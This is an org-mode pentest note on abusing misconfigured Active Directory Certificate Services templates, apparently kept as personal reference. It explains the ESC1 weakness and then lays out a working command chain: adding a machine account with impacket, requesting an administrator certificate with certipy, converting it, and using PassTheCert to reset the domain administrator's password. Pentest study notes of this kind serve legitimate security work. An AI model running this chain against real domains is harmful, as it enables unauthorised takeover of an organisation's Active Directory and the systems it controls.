:PROPERTIES:
:ID:       88668f82-ad94-481f-9466-de6691494de2
:END:
#+title: Pentest - Active Directory - Certificate Services
#+filetags: :cert:activeDirectory:pentest:
#+hugo_base_dir:../


* Active Directory Certificate Services
[[https://social.technet.microsoft.com/wiki/contents/articles/3063.certutil-examples-for-managing-active-directory-certificate-services-ad-cs-from-the-command-line.aspx][social.technet.microsoft.com]]

Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. [[https://medium.com/@shaunwhorton/active-directory-certificate-services-domain-dominance-9ba2c54988d7][medium - shaun whorton]]




* Abusing misconfigured certificate templates

Use =Certify.exe= to enumerate Certificate Services [[https://github.com/GhostPack/Certify][GhostPack/Certify]]

#+begin_src sh
PS C:\ > .\Certify.exe find /vulnerable
#+end_src

#+ATTR_ORG: :width 1200
[[../static/images/certify1.png]]


Here's an example of a vulnerable cert template, which is used for client authentication.  Domain Users have enrollments rights, and they're also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)

#+ATTR_ORG: :width 1200
[[../static/images/certify2.png]]

** Python
[[https://github.com/ly4k/Certipy]]



[[https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf][specterops - certified pre-owned]]
* Examples
** ESC1 vulnerability

#+ATTR_ORG: :width 1200
[[../static/images/certify3.png]]

- Client Authentication: True - an issued certificate can be used for client authentication purposes.

- Enrollee Supplies Subject : True - a Subject Alternative Name can be specified which allows a certificate to be requested as another user on the system (e.g., administrator).

- Requires Manager Approval : False - a requested certificate doesn't require approval from a user with certificate manager permissions.

- Enrollment Rights : Domain\Domain Computers - this gives low-level users the ability to request a certificate by simply joining a computer to the domain.


User happens to be able to join machines to the domain -- from *whoami /priv*

  #+begin_src sh
  Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
#+end_src

Use impacket to join a computer to the domain:

#+begin_src sh
addcomputer.py 'domain/<user>:<pw>' -method LDAPS -computer-name 'PC01' -computer-pass 'Welcome123'
#+end_src

Use _certipy_ to request cert for admin
#+begin_src sh
certipy req -username 'PC01$' -password 'Welcome123' -ca AUTHORITY-CA -target <ip> -template '' -upn 'administrator@domain'
#+end_src

Can try to auth

#+begin_src sh
certipy auth -pfx administrator.pfx
#+end_src

In this case there's a kerberos session error -> authenticate with LDAP instead of kerberos.  Use [[https://github.com/AlmondOffSec/PassTheCert?source=post_page-----8d6bbd770266--------------------------------][PassTheCert]] -- first convert
#+begin_src sh
certipy cert -pfx administrator.pfx -nokey -out user.crt
#+end_src
#+begin_src sh
certipy cert -pfx administrator.pfx -nocert -out user.key
#+end_src

Then, eg, change the admin password:
#+begin_src sh
python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain <domain> -dc-ip <ip> -target administrator -new-pass
#+end_src
